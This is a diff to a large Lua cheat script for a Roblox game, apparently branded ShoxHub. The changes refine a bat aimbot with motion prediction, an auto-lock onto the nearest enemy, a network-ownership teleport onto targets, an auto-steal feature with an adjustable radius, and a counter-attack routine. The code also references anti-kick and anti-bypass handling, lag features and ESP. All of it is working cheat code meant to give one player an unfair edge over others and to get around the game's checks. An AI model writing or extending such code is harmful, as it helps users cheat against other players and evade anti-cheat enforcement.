 function _G.AmbitiousSafeModeHoldingBrainrot()
     local ok, val = pcall(function() return LP:GetAttribute("Stealing") end)
     if ok and val == true then return true end
-    local ok2, val2 = pcall(function() return LP:GetAttribute("AntiKick") end)
-    if ok2 and val2 == true then return true end
     local char = LP.Character
     if not char then return false end
     local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
@@ -3639,46 +3878,36 @@ local function _bodyLockTick()
     if not root then return end
     local hum = char:FindFirstChildOfClass("Humanoid")
     if not hum then return end
+
     local target = getClosestTargetBody()
     if not target then
         if not hum.AutoRotate then hum.AutoRotate = true end
         return
     end
-    local dist = (target.Position - root.Position).Magnitude
-    if dist > bodyLockRange then
+
+    local offset = target.Position - root.Position
+    if offset.Magnitude > bodyLockRange then
         if not hum.AutoRotate then hum.AutoRotate = true end
         return
     end
     if hum.AutoRotate then hum.AutoRotate = false end
-    local targetVel = target.AssemblyLinearVelocity
-    local speed3 = targetVel.Magnitude
-    local predictTime = _clamp(speed3 / 80, 0.08, 0.35)
-    local predictedPos = target.Position + targetVel * predictTime
-    local targetHead = target.Parent and target.Parent:FindFirstChild("Head")
-    local targetHeight = targetHead and targetHead.Position.Y or target.Position.Y
-    local myHeight = root.Position.Y + (hum.HipHeight or 0)
-    local heightDiff = targetHeight - myHeight
-    local verticalCorrection = _clamp(heightDiff * 0.15, -1.5, 1.5)
-    local flatTarget = _V3new(predictedPos.X, root.Position.Y + verticalCorrection, predictedPos.Z)
-    local toPredict = flatTarget - root.Position
-    if toPredict.Magnitude > 0.1 then
-        local goalCF = _CFlookAt(root.Position, flatTarget)
-        local diffCF = root.CFrame:Inverse() * goalCF
-        local _, ry, _ = diffCF:ToEulerAnglesXYZ()
-        ry = _clamp(ry, -2.5, 2.5)
-        root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(_V3new(0, ry * 42, 0))
-    end
+
+    local targetVelocity = target.AssemblyLinearVelocity
+    local predictTime = _clamp(targetVelocity.Magnitude / 80, 0.08, 0.35)
+    local predicted = target.Position + targetVelocity * predictTime
+    local flatTarget = _V3new(predicted.X, root.Position.Y, predicted.Z)
+    local flatDirection = flatTarget - root.Position
+    if flatDirection.Magnitude <= 0.1 then return end
+
+    -- Rotate on the horizontal plane only; avoid writing AngularVelocity every frame.
+    local goal = CFrame.lookAt(root.Position, flatTarget)
+    root.CFrame = root.CFrame:Lerp(goal, 0.25)
 end
 
 function startBodyLock()
     if _bodyLockConn then _bodyLockConn:Disconnect() end
-    local acc = 0
-    _bodyLockConn = RunService.Heartbeat:Connect(function(dt)
-        if not bodyLockEnabled then return end
-        if _blSuppressCount > 0 then return end
-        acc = acc + dt
-        if acc < 0.033 then return end
-        acc = 0
+    _bodyLockConn = RunService.Heartbeat:Connect(function()
+        if not bodyLockEnabled or _blSuppressCount > 0 then return end
         _bodyLockTick()
     end)
 end
@@ -3692,7 +3921,7 @@ function stopBodyLock()
     local root = c and c:FindFirstChild("HumanoidRootPart")
     if root then
         root.AssemblyAngularVelocity = _V3zero
-        root.AssemblyLinearVelocity = _V3new(root.AssemblyLinearVelocity.X, -0.1, root.AssemblyLinearVelocity.Z)
+        -- Preserve the Humanoid's current jump/fall velocity when stopping the lock.
     end
     local hum2 = c and c:FindFirstChildOfClass("Humanoid")
     if hum2 then hum2.AutoRotate = true end
@@ -4070,7 +4299,6 @@ function trySwing()
         local char = LP.Character
         if not char then return end
         local currentTool = char:FindFirstChildOfClass("Tool")
-        if currentTool and not isBatTool(currentTool) then return end
         local bat = findBat()
         if bat then
             if bat.Parent ~= char then
@@ -4299,8 +4527,9 @@ local function bbNearestTarget(root)
     local nearest, nearestDistance = nil, math.huge
     for _, candidate in ipairs(Players:GetPlayers()) do
         if candidate ~= LP and candidate.Character then
-            local targetRoot     = candidate.Character:FindFirstChild("HumanoidRootPart")
-            local targetHumanoid = candidate.Character:FindFirstChildOfClass("Humanoid")
+            local targetCharacter = candidate.Character
+            local targetRoot     = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
+            local targetHumanoid = targetCharacter and targetCharacter:FindFirstChildOfClass("Humanoid")
             if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
                 local distance = (root.Position - targetRoot.Position).Magnitude
                 if distance < nearestDistance then
@@ -4363,6 +4592,10 @@ function BB.Stop()
     if root     then root.AssemblyAngularVelocity = Vector3.zero end
     bbResetTarget()
     Z.lastActivationTime = 0
+    if BB.BodyLockSuppressed then
+        BB.BodyLockSuppressed = false
+        _unsuppressBodyLock(true)
+    end
 end
 
 function BB.Start()
@@ -4375,6 +4608,10 @@ function BB.Start()
 
     BB.Enabled = true
     humanoid.AutoRotate = false
+    if not BB.BodyLockSuppressed then
+        BB.BodyLockSuppressed = true
+        _suppressBodyLock()
+    end
 
     local bat = BB.FindBat()
     if bat and bat.Parent ~= char then
@@ -4464,16 +4701,17 @@ function BB.Start()
         local serverDelay = Z.currentPing + ZCFG.SERVER_TICKRATE
         if quickTurn then serverDelay *= ZCFG.QUICK_DIRECTION_CHANGE_MULTIPLIER end
 
-        local predicted    = targetPos + predictionVelocity * serverDelay
-        local acceleration = bbAverageVector(Z.accelerationHistory)
-        predicted += acceleration * ZCFG.ACCELERATION_PREDICTION_WEIGHT * (serverDelay * serverDelay * 0.5)
-
         local predictionTime = ZCFG.PREDICTION_TIME * 1.1
+        local predicted = targetPos + predictionVelocity * (serverDelay + predictionTime)
+        local acceleration = bbAverageVector(Z.accelerationHistory)
+        -- Clamp noisy frame-to-frame acceleration so one spike cannot launch prediction far away.
+        local accelerationMagnitude = acceleration.Magnitude
+        if accelerationMagnitude > 120 then
+            acceleration = acceleration.Unit * 120
+        end
+        predicted += acceleration * ZCFG.ACCELERATION_PREDICTION_WEIGHT * (serverDelay * serverDelay * 0.5)
         if airborne then
-            predicted += predictionVelocity * predictionTime
             predicted += Vector3.new(0, -0.5 * ZCFG.GRAVITY * predictionTime * predictionTime, 0)
-        else
-            predicted += predictionVelocity * predictionTime
         end
 
         local flatPrediction = Vector3.new(predictionVelocity.X, 0, predictionVelocity.Z)
@@ -4835,7 +5073,6 @@ end
 -- ══════════════════════════════════════════════════════
 local function tpBatNetworkOwnerTeleport(root, targetRoot)
     pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(nil) end end)
-    task.wait()
     local targetPosition = targetRoot.Position + _V3new(0, 0.9, 0)
     root.CFrame = _CFnew(targetPosition)
     root.AssemblyLinearVelocity = targetRoot.AssemblyLinearVelocity
@@ -4851,13 +5088,6 @@ local function tpBatUpdate()
     local root      = character and character:FindFirstChild("HumanoidRootPart")
     local humanoid  = character and character:FindFirstChildOfClass("Humanoid")
     if not root or not humanoid then return end
-
-    local animator = humanoid:FindFirstChildOfClass("Animator")
-    if animator then
-        pcall(function()
-            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do track:Stop() end
-        end)
-    end
 
     local bat = tpBatGetBat()
     if bat and bat.Parent ~= character then
@@ -5132,12 +5362,15 @@ function startBatCounter()
             batCounterDebounce = true
             _suppressBodyLock()
             task.spawn(function()
-                task.wait(0.15)
-                local bat = findBatForCounter()
-                if bat then swingBatForCounter(bat, character) end
-                task.wait(0.3)
+                local ok, err = xpcall(function()
+                    task.wait(0.15)
+                    local bat = findBatForCounter()
+                    if bat then swingBatForCounter(bat, character) end
+                    task.wait(0.3)
+                end, function(e) return tostring(e) end)
                 batCounterDebounce = false
-                _unsuppressBodyLock(true)
+                pcall(_unsuppressBodyLock, true)
+                if not ok then warn("[ShoxHub] Bat Counter recovered: " .. tostring(err)) end
             end)
         end
     end)
@@ -5378,6 +5611,8 @@ function executeDropWithToggle(setVisual)
     end)
 end
 
+local antiLagOriginalProperties = setmetatable({}, {__mode = "k"})
+
 local function applyAntiLagDerender(obj)
     pcall(function()
         if obj:GetAttribute("_AmbitiousHubSky") ~= nil then return end
@@ -5393,6 +5628,11 @@ local function applyAntiLagDerender(obj)
             if char and obj:IsDescendantOf(char) then return end
             obj:Destroy()
         elseif obj:IsA("BasePart") then
+            local ownChar = LP.Character
+            if ownChar and obj:IsDescendantOf(ownChar) then return end
+            if not antiLagOriginalProperties[obj] then
+                antiLagOriginalProperties[obj] = {Material=obj.Material, Reflectance=obj.Reflectance, CastShadow=obj.CastShadow, TopSurface=obj.TopSurface, BottomSurface=obj.BottomSurface, FrontSurface=obj.FrontSurface, BackSurface=obj.BackSurface, LeftSurface=obj.LeftSurface, RightSurface=obj.RightSurface}
+            end
             obj.Material      = Enum.Material.Plastic
             obj.Reflectance   = 0
             obj.CastShadow    = false
@@ -5415,8 +5655,8 @@ local function applyAntiLagDerender(obj)
         elseif obj:IsA("PointLight") or obj:IsA("SpotLight")
             or obj:IsA("SurfaceLight") then
             obj.Enabled = false
-        elseif obj:IsA("SelectionBox") and obj.Name ~= "AmbitiousHubESP" then
-            pcall(function() obj:Destroy() end)
+        elseif obj:IsA("SelectionBox") then
+            return
         end
     end)
 end
@@ -5426,8 +5666,8 @@ function enableAntiLag()
     removeAccessoriesEnabled = true
 
     _G._AmbitiousDefLightBrightness = _G._AmbitiousDefLightBrightness or Lighting.Brightness
-    _G._AmbitiousDefLightClock      = _G._AmbitiousDefLightClock      or Lighting.ClockTime
-    _G._AmbitiousDefLightAmbient    = _G._AmbitiousDefLightAmbient    or Lighting.OutdoorAmbient
+    _G._AmbitiousDefLightClock      = _G._AmbitiousDefLightClock or Lighting.ClockTime
+    _G._AmbitiousDefLightAmbient    = _G._AmbitiousDefLightAmbient or Lighting.OutdoorAmbient
 
     pcall(function()
         settings().Rendering.QualityLevel        = 1
@@ -5506,6 +5746,16 @@ function disableAntiLag()
     if antiLagDescConn then
         antiLagDescConn:Disconnect()
         antiLagDescConn = nil
+    end
+    for part, props in pairs(antiLagOriginalProperties) do
+        if part and part.Parent then
+            pcall(function()
+                part.Material=props.Material; part.Reflectance=props.Reflectance; part.CastShadow=props.CastShadow
+                part.TopSurface=props.TopSurface; part.BottomSurface=props.BottomSurface; part.FrontSurface=props.FrontSurface
+                part.BackSurface=props.BackSurface; part.LeftSurface=props.LeftSurface; part.RightSurface=props.RightSurface
+            end)
+        end
+        antiLagOriginalProperties[part] = nil
     end
     if skyTheme == "Off" then
         pcall(function()
@@ -6356,6 +6606,9 @@ end
 -- ═══════════════════════════════════════════════════════════════════════════
 -- CONFIG
 -- ═══════════════════════════════════════════════════════════════════════════
+ShoxHubAutoTPDown = ShoxHubAutoTPDown == true
+ShoxHubAutoTPDownHeight = tonumber(ShoxHubAutoTPDownHeight) or 20
+ShoxHubShowE01Warning = ShoxHubShowE01Warning == true
 function buildConfigTable()
     local config = {
         normalSpeed = NS,
@@ -6393,7 +6646,6 @@ function buildConfigTable()
         katanaSkinEnabled = katanaSkinEnabled,
         minecraftBatSkinEnabled = minecraftBatSkinEnabled,
         minecraftBatSkinColorMode = minecraftBatSkinColorMode,
-        shoxHubSongIndex = ShoxHubSongIndex,
         shoxHubAutoTPDown = ShoxHubAutoTPDown,
         shoxHubAutoTPDownHeight = ShoxHubAutoTPDownHeight,
         shoxHubShowE01Warning = ShoxHubShowE01Warning,
@@ -6406,7 +6658,7 @@ function buildConfigTable()
         noCamCollision    = noCamCollisionEnabled == true,
         hideMobileButtons = _G.AmbitiousHideMobileButtons == true,
         mobileHideList  = _G.AmbitiousMobileHideList,
-        mobileButtonPositions = savedButtonPositions,
+        mobileButtonPositions = (function() local copy = {}; for k, v in pairs(savedButtonPositions or {}) do copy[k] = v end; return copy end)(),
         mobileButtonsLocked = mobileButtonsLocked,
         dropBrainrotKey = {kb = KB.DropBrainrot.kb and KB.DropBrainrot.kb.Name, gp = KB.DropBrainrot.gp and KB.DropBrainrot.gp.Name},
         autoLeftKey = {kb = KB.AutoLeft.kb and KB.AutoLeft.kb.Name, gp = KB.AutoLeft.gp and KB.AutoLeft.gp.Name},
@@ -6461,10 +6713,36 @@ function buildConfigTable()
     return config
 end
 
+-- JSON-safe conversion for Roblox datatypes. Settings are plain data only;
+-- instances/connections/functions are intentionally rejected instead of crashing saves.
+local function ShoxHubToJSON(value, seen)
+    local valueType = typeof(value)
+    if valueType == "Vector2" then return {__shoxType="Vector2", X=value.X, Y=value.Y} end
+    if valueType == "Vector3" then return {__shoxType="Vector3", X=value.X, Y=value.Y, Z=value.Z} end
+    if valueType == "Color3" then return {__shoxType="Color3", R=value.R, G=value.G, B=value.B} end
+    if valueType == "CFrame" then return {__shoxType="CFrame", Components={value:GetComponents()}} end
+    if valueType == "UDim" then return {__shoxType="UDim", Scale=value.Scale, Offset=value.Offset} end
+    if valueType == "UDim2" then return {__shoxType="UDim2", X={Scale=value.X.Scale, Offset=value.X.Offset}, Y={Scale=value.Y.Scale, Offset=value.Y.Offset}} end
+    if valueType == "EnumItem" then return {__shoxType="EnumItem", EnumType=tostring(value.EnumType), Name=value.Name} end
+    if valueType == "nil" or valueType == "string" or valueType == "number" or valueType == "boolean" then return value end
+    if valueType ~= "table" then return nil end
+    seen = seen or {}
+    if seen[value] then return nil end
+    seen[value] = true
+    local result = {}
+    for key, child in pairs(value) do
+        local safeKey = (type(key) == "string" or type(key) == "number") and key or nil
+        if safeKey ~= nil then result[safeKey] = ShoxHubToJSON(child, seen) end
+    end
+    seen[value] = nil
+    return result
+end
+
 function saveAllSettings()
     if _isResetting then return true end
     local config = buildConfigTable()
-    local json = HS:JSONEncode(config)
+    local encodeOk, json = pcall(function() return HS:JSONEncode(ShoxHubToJSON(config)) end)
+    if not encodeOk or type(json) ~= "string" then return false end
     if json == _lastSavedJSON then return true end
     local success, err = pcall(function() writefile(CONFIG_FILE, json) end)
     if success then _lastSavedJSON = json end
@@ -6474,7 +6752,7 @@ end
 function loadAllSettings()
     if not isfile or not isfile(CONFIG_FILE) then return false end
     local success, data = pcall(function() return HS:JSONDecode(readfile(CONFIG_FILE)) end)
-    if not success or not data then return false end
+    if not success or type(data) ~= "table" then return false end
     _isLoading = true
     NS = data.normalSpeed or NS
     CS = data.carrySpeed or CS
@@ -6508,8 +6786,14 @@ function loadAllSettings()
     if pbScale then pbScale.Scale = progressBarScale end
     espEnabled = data.espEnabled or false
     if espEnabled then toggleESP(true) else toggleESP(false) end
-    currentColorTheme = "Gris"
-    selectedColor = COLOR_THEMES["Gris"]
+    local savedTheme = data.themeColor
+    if type(savedTheme) == "string" and COLOR_THEMES[savedTheme] then
+        currentColorTheme = savedTheme
+        selectedColor = COLOR_THEMES[savedTheme]
+    else
+        currentColorTheme = currentColorTheme or "Gris"
+        selectedColor = COLOR_THEMES[currentColorTheme] or COLOR_THEMES["Gris"]
+    end
 
     _G.AceAntiBypassLoadFromConfig(data)
     autoBatV2Enabled = _G.AceAntiBypassAimbotOn == true
@@ -6535,7 +6819,6 @@ function loadAllSettings()
         MinecraftBatSkin.State.enabled = false
         task.defer(function() pcall(MinecraftBatSkin.Remove) end)
     end
-    if type(data.shoxHubSongIndex)=="number" then ShoxHubSongIndex=math.clamp(math.floor(data.shoxHubSongIndex),1,#ShoxHubSongs) end
     ShoxHubAutoTPDown = data.shoxHubAutoTPDown == true
     ShoxHubAutoTPDownHeight = math.clamp(tonumber(data.shoxHubAutoTPDownHeight) or ShoxHubAutoTPDownHeight, 0, 500)
     ShoxHubShowE01Warning = data.shoxHubShowE01Warning == true
@@ -6698,10 +6981,15 @@ function loadAllSettings()
         if setUnwalkVisual then setUnwalkVisual(false) end
     end
 
-    _lastSavedJSON = HS:JSONEncode(buildConfigTable())
+    local cacheOk, cacheJson = pcall(function()
+        return HS:JSONEncode(ShoxHubToJSON(buildConfigTable()))
+    end)
+    _lastSavedJSON = cacheOk and cacheJson or nil
     _isLoading = false
     return true
 end
+
+local contentPages = nil
 
 function forceResetUI()
     if normalBox then normalBox.Text = tostring(NS) end
@@ -6789,8 +7077,14 @@ function forceResetUI()
         local label = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
         ref.btn.Text = label
     end
-    currentColorTheme = "Gris"
-    selectedColor = COLOR_THEMES["Gris"]
+    local savedTheme = data.themeColor
+    if type(savedTheme) == "string" and COLOR_THEMES[savedTheme] then
+        currentColorTheme = savedTheme
+        selectedColor = COLOR_THEMES[savedTheme]
+    else
+        currentColorTheme = currentColorTheme or "Gris"
+        selectedColor = COLOR_THEMES[currentColorTheme] or COLOR_THEMES["Gris"]
+    end
     updateAllUIThemeColors(selectedColor)
     backgroundIndex = 1
     if backgroundImage then
@@ -7404,8 +7698,13 @@ function buildGui()
 
     local slideTween = nil
     local mainOriginalPos = main.Position
+    local isMainSliding = false
+    main:GetPropertyChangedSignal("Position"):Connect(function()
+        if main and main.Visible and not isMainSliding then mainOriginalPos = main.Position end
+    end)
 
     showGui = function()
+        isMainSliding = true
         if slideTween then slideTween:Cancel() end
         if not main then return end
         main.Visible = true
@@ -7413,10 +7712,11 @@ function buildGui()
         main.Position = UDim2.new(0, -GUI_W - 20, 0, 2)
         slideTween = TS:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = mainOriginalPos})
         slideTween:Play()
-        slideTween.Completed:Connect(function() slideTween = nil end)
+        slideTween.Completed:Connect(function() slideTween = nil; isMainSliding = false end)
     end
 
     hideGui = function()
+        isMainSliding = true
         if slideTween then slideTween:Cancel() end
         if not main or not main.Visible then return end
         local targetPos = UDim2.new(0, -GUI_W - 20, 0, 2)
@@ -7426,6 +7726,7 @@ function buildGui()
             main.Visible = false
             miniBtn.Visible = true
             slideTween = nil
+            isMainSliding = false
         end)
     end
 
@@ -7460,9 +7761,9 @@ function buildGui()
     tabContent.ClipsDescendants = true
     tabContent.ZIndex = 5
 
-    local tabs = {"Speed", "Custom", "Visual", "Settings", "Keybinds"}
+    local tabs = {"Speed", "Combat", "Visual", "Settings", "Keybinds"}
     tabButtons = {}
-    local contentPages = {}
+    contentPages = {}
 
     for i, name in ipairs(tabs) do
         local btn = Instance.new("TextButton", tabBar)
@@ -7796,11 +8097,9 @@ function buildGui()
         clk.AutoButtonColor = false
         clk.ZIndex = 10
         clk.MouseButton1Click:Connect(function()
-            if editModeEnabled and not uiLocked then
-                pcall(cb, not on)
-            else
-                on = not on
-                sv(on)
+            on = not on
+            sv(on)
+            if not (editModeEnabled and not uiLocked) then
                 pcall(cb, on)
             end
         end)
@@ -7954,16 +8253,18 @@ function buildGui()
         rightZone.ZIndex = 11
 
         local function refreshDotsSilent()
+            local activeDot = (#options <= MAX_DOTS) and currentIdx or math.clamp(math.floor(((currentIdx - 1) / math.max(#options - 1, 1)) * (dotCount - 1) + 1.5), 1, dotCount)
             for i, d in ipairs(dots) do
-                local active = (i == currentIdx)
+                local active = (i == activeDot)
                 d.BackgroundColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 160)
                 d.Size = active and UDim2.new(0, 10, 0, 5) or UDim2.new(0, 5, 0, 5)
             end
         end
 
         local function refreshDotsAnimated()
+            local activeDot = math.clamp(math.floor(((currentIdx - 1) / math.max(#options - 1, 1)) * (#dots - 1) + 1.5), 1, #dots)
             for i, d in ipairs(dots) do
-                local active = (i == currentIdx)
+                local active = (i == activeDot)
                 TS:Create(d, TweenInfo.new(0.22, Enum.EasingStyle.Quad), {
                     BackgroundColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 160),
                     Size = active and UDim2.new(0, 10, 0, 5) or UDim2.new(0, 5, 0, 5),
@@ -8167,10 +8468,10 @@ function buildGui()
         end)
     end
 
-    local combatPage = contentPages["Custom"]
+    local combatPage = contentPages["Combat"]
 
-    mkSect(combatPage, "Aimbots")
-    autoBatSetVisual = mkToggle(combatPage, "Auto Bat", function(on)
+    mkSect(combatPage, "Bat Aimbot")
+    autoBatSetVisual = mkToggle(combatPage, "Bat Aimbot", function(on)
         if on then enableAutoBat() else disableAutoBat() end
         if mobSetAutoBat then mobSetAutoBat(on) end
     end)
@@ -8190,6 +8491,37 @@ function buildGui()
     end)
     if autoBatV2SetVisual then autoBatV2SetVisual(autoBatV2Enabled) end
     _G.AceAimbotSetVisual = autoBatV2SetVisual
+
+    -- Auto Steal belongs with combat/gameplay actions, not general Settings.
+    mkSect(combatPage, "Auto Steal")
+    setInstaGrab = mkToggle(combatPage, "Auto Steal", function(on)
+        CONFIG.AUTO_STEAL_ENABLED = on
+        if on then pcall(startAutoSteal) else stopAutoSteal() end
+        updateProgressBarVisibility()
+    end)
+
+    do
+        local row = mkRow(combatPage, 38)
+        mkLabel(row, "Steal Radius")
+        radInput = mkBox(row, CONFIG.STEAL_RANGE, 50, 56, function(v)
+            if v and v >= 5 and v <= 300 then
+                CONFIG.STEAL_RANGE = _floor(v+0.5)
+                Steal.StealRadius = CONFIG.STEAL_RANGE
+                radInput.Text = tostring(CONFIG.STEAL_RANGE)
+                saveAllSettings()
+            end
+        end)
+    end
+
+    do
+        local row = mkRow(combatPage, 38)
+        mkLabel(row, "Steal Version")
+        autoStealVariantLabel = mkNeoSelector(row, autoStealVariantName(autoStealVariant), AUTO_STEAL_VARIANT_NAMES, function(selected)
+            autoStealVariant = autoStealVariantFromName(selected)
+            saveAllSettings()
+        end)
+    end
+
 
     mkSect(combatPage, "Counters")
     setBatCounterVisual = mkToggle(combatPage, "Bat Counter", function(on)
@@ -8581,43 +8913,17 @@ function buildGui()
 
     mkSect(configPage, "Intro")
     do
-        local row=mkRow(configPage,38)
-        mkLabel(row,"Intro Song")
-        local choices={}
-        for i=1,#ShoxHubSongs do choices[i]="Song "..i end
-        mkNeoSelector(row,"Song "..ShoxHubSongIndex,choices,function(selected)
-            ShoxHubSongIndex=math.clamp(tonumber(selected:match("%d+")) or 1,1,#ShoxHubSongs)
-            saveAllSettings()
-        end)
-    end
-
-    mkSect(configPage, "Auto Steal")
-    setInstaGrab = mkToggle(configPage, "Auto Steal", function(on)
-        CONFIG.AUTO_STEAL_ENABLED = on
-        if on then pcall(startAutoSteal) else stopAutoSteal() end
-        updateProgressBarVisibility()
-    end)
-
-    do
         local row = mkRow(configPage, 38)
-        mkLabel(row, "Steal Radius")
-        radInput = mkBox(row, CONFIG.STEAL_RANGE, 50, 56, function(v)
-            if v and v >= 5 and v <= 300 then
-                CONFIG.STEAL_RANGE = _floor(v+0.5)
-                Steal.StealRadius = CONFIG.STEAL_RANGE
-                radInput.Text = tostring(CONFIG.STEAL_RANGE)
-                saveAllSettings()
-            end
-        end)
-    end
-
-    do
-        local row = mkRow(configPage, 38)
-        mkLabel(row, "Steal Version")
-        autoStealVariantLabel = mkNeoSelector(row, autoStealVariantName(autoStealVariant), AUTO_STEAL_VARIANT_NAMES, function(selected)
-            autoStealVariant = autoStealVariantFromName(selected)
-            saveAllSettings()
-        end)
+        mkLabel(row, "ShoxHub Intro")
+        local info = Instance.new("TextLabel", row)
+        info.BackgroundTransparency = 1
+        info.Size = UDim2.new(0, 175, 1, 0)
+        info.Position = UDim2.new(1, -183, 0, 0)
+        info.Font = Enum.Font.Gotham
+        info.TextSize = 11
+        info.TextXAlignment = Enum.TextXAlignment.Right
+        info.TextColor3 = Color3.fromRGB(170, 205, 235)
+        info.Text = "SHOXHUB animation"
     end
 
     mkSect(configPage, "UI Settings")
@@ -8809,6 +9115,55 @@ function buildGui()
             listHolder.Visible = ex
             arrowBtn.Text = ex and "▲" or "▼"
         end)
+    end
+
+    mkSect(configPage, "UI Color Themes")
+    do
+        local themeNames = {"Gris", "Abyss Blue", "Venom Green", "Royal Gold", "Velvet Rose", "Crimson Night", "Violet", "Cyan"}
+        local row = mkRow(configPage, 72)
+        local info = Instance.new("TextLabel", row)
+        info.BackgroundTransparency = 1
+        info.Position = UDim2.new(0, 10, 0, 2)
+        info.Size = UDim2.new(1, -20, 0, 20)
+        info.Font = Enum.Font.GothamSemibold
+        info.TextSize = 12
+        info.TextXAlignment = Enum.TextXAlignment.Left
+        info.TextColor3 = Color3.fromRGB(225, 225, 235)
+        info.Text = "Choose an accent color for the hub UI"
+        info.ZIndex = 8
+        local holder = Instance.new("Frame", row)
+        holder.BackgroundTransparency = 1
+        holder.Position = UDim2.new(0, 8, 0, 27)
+        holder.Size = UDim2.new(1, -16, 0, 36)
+        holder.ZIndex = 8
+        local layout = Instance.new("UIGridLayout", holder)
+        layout.CellSize = UDim2.new(0, 30, 0, 30)
+        layout.CellPadding = UDim2.new(0, 7, 0, 4)
+        layout.FillDirectionMaxCells = 8
+        for _, themeName in ipairs(themeNames) do
+            local swatch = Instance.new("TextButton", holder)
+            swatch.Name = "Theme_" .. themeName:gsub("%s+", "")
+            swatch.Size = UDim2.fromOffset(30, 30)
+            swatch.BackgroundColor3 = COLOR_THEMES[themeName]
+            swatch.BorderSizePixel = 0
+            swatch.Text = ""
+            swatch.AutoButtonColor = true
+            swatch.ZIndex = 9
+            Instance.new("UICorner", swatch).CornerRadius = UDim.new(1, 0)
+            local stroke = Instance.new("UIStroke", swatch)
+            stroke.Color = Color3.fromRGB(245, 245, 250)
+            stroke.Thickness = 1
+            stroke.Transparency = currentColorTheme == themeName and 0 or 0.7
+            swatch.MouseButton1Click:Connect(function()
+                applyColorTheme(themeName)
+                for _, other in ipairs(holder:GetChildren()) do
+                    if other:IsA("TextButton") then
+                        local outline = other:FindFirstChildOfClass("UIStroke")
+                        if outline then outline.Transparency = other == swatch and 0 or 0.7 end
+                    end
+                end
+            end)
+        end
     end
 
     mkSect(configPage, "Config Management")
@@ -9062,7 +9417,7 @@ function buildGui()
     pbFrame.BackgroundColor3 = Color3.fromRGB(10,10,10)
     pbFrame.BackgroundTransparency = 0
     pbFrame.BorderSizePixel = 0
-    pbFrame.Active = true
+    pbFrame.Active = false
     pbFrame.ClipsDescendants = true
     pbFrame.Visible = CONFIG.AUTO_STEAL_ENABLED
     pbFrame.ZIndex = 10
@@ -9205,7 +9560,12 @@ function createMobilePanel()
     container.Name = "FloatingPanel"
     container.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
     container.AnchorPoint = Vector2.new(1, 0)
-    container.Position = UDim2.new(1, -12, 0, 110)
+    local mpp = savedMobilePanelPos
+    if type(mpp) == "table" then
+        container.Position = UDim2.new(tonumber(mpp.XScale) or 1, tonumber(mpp.XOffset) or -12, tonumber(mpp.YScale) or 0, tonumber(mpp.YOffset) or 110)
+    else
+        container.Position = UDim2.new(1, -12, 0, 110)
+    end
     container.BackgroundTransparency = 1
     container.BorderSizePixel = 0
     container.Active = true
@@ -9349,6 +9709,16 @@ function createMobilePanel()
         btn.InputChanged:Connect(onInputChanged)
         btn.InputEnded:Connect(onInputEnded)
 
+        -- A finger may be released outside the button, so GuiObject.InputEnded alone is insufficient.
+        local globalInputEnded = UIS.InputEnded:Connect(onInputEnded)
+        local globalTouchEnded = UIS.TouchEnded:Connect(onInputEnded)
+        btn.Destroying:Connect(function()
+            if globalInputEnded then globalInputEnded:Disconnect(); globalInputEnded = nil end
+            if globalTouchEnded then globalTouchEnded:Disconnect(); globalTouchEnded = nil end
+            dragging = false
+            _isDraggingButton = false
+        end)
+
         buttons[name] = {btn = btn, setActive = setActive, label = label}
         return setActive
     end
@@ -9451,9 +9821,11 @@ function createMobilePanel()
     if buttons.Lagger1 and buttons.Lagger1.setActive then buttons.Lagger1.setActive(laggerToggled) end
     if buttons.Lagger2 and buttons.Lagger2.setActive then buttons.Lagger2.setActive(laggerCarryToggled) end
 
-    -- Hard-anchor the complete mobile control grid to the far-right viewport edge.
+    -- Preserve the restored/saved position; only use the default if no position exists.
     container.AnchorPoint = Vector2.new(1, 0)
-    container.Position = UDim2.new(1, -8, 0, 110)
+    if not savedMobilePanelPos then
+        container.Position = UDim2.new(1, -12, 0, 110)
+    end
     container.Visible = true
     panel.Enabled = true
 
@@ -9851,8 +10223,9 @@ local _batCounterV2Cooldown = 0.01
 
 local function isPlayerRagdolled(player)
     if not player or not player.Character then return false end
-    local hum = player.Character:FindFirstChildOfClass("Humanoid")
-    if not hum then return false end
+    local character = player.Character
+    local hum = character and character:FindFirstChildOfClass("Humanoid")
+    if not hum or hum.Health <= 0 then return false end
     local state = hum:GetState()
     return state == Enum.HumanoidStateType.Physics or
            state == Enum.HumanoidStateType.Ragdoll or
@@ -9880,8 +10253,9 @@ local function getAttackingPlayerWithAnimal()
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LP and plr.Character then
             if not hasAnimalEquipped(plr) then continue end
-            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
-            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+            local targetCharacter = plr.Character
+            local tRoot = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
+            local hum = targetCharacter and targetCharacter:FindFirstChildOfClass("Humanoid")
             if tRoot and hum and hum.Health > 0 then
                 local dist = (tRoot.Position - myRoot.Position).Magnitude
                 if dist < 12 and dist < minDist then
@@ -10252,16 +10626,28 @@ function updateUIFromLoaded()
         local container = MobilePanel:FindFirstChild("FloatingPanel")
         if container then
             container.AnchorPoint = Vector2.new(1, 0)
-            container.Position = UDim2.new(1, -8, 0, 110)
+            local mpp = savedMobilePanelPos
+            if type(mpp) == "table" then
+                container.Position = UDim2.new(tonumber(mpp.XScale) or 1, tonumber(mpp.XOffset) or -8, tonumber(mpp.YScale) or 0, tonumber(mpp.YOffset) or 110)
+            else
+                container.Position = UDim2.new(1, -8, 0, 110)
+            end
             container.Visible = true
             MobilePanel.Enabled = true
             local btnCont = container:FindFirstChild("ButtonsContainer")
             if btnCont then
+                local keyByButton = {TpDown="tp", AutoBat="aimbot", AutoLeft="autoLeft", AutoRight="autoRight", DropBR="drop", Carry="carry", Lagger1="laggerNormal", Lagger2="laggerCarry"}
                 for _, btn in ipairs(btnCont:GetChildren()) do
                     if btn:IsA("TextButton") then
